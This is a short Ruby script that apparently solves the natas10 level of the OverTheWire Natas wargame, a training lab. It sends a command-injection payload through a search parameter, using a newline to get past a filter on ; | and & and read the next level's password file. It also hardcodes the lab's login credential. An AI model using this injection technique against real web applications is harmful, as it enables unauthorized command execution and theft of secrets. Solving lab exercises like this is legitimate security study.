#!/usr/bin/ruby
require "net/http"

# Now with filtering!
# /[;|&]/

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

url = URI.parse "http://%s.natas.labs.overthewire.org/?needle=%s&submit=Search" % [username, URI.encode("\ncat /etc/natas_webpass/natas11 #")]
client = Net::HTTP.new url.host, url.port

req = Net::HTTP::Get.new url
req.basic_auth username, password

print (client.request req).body
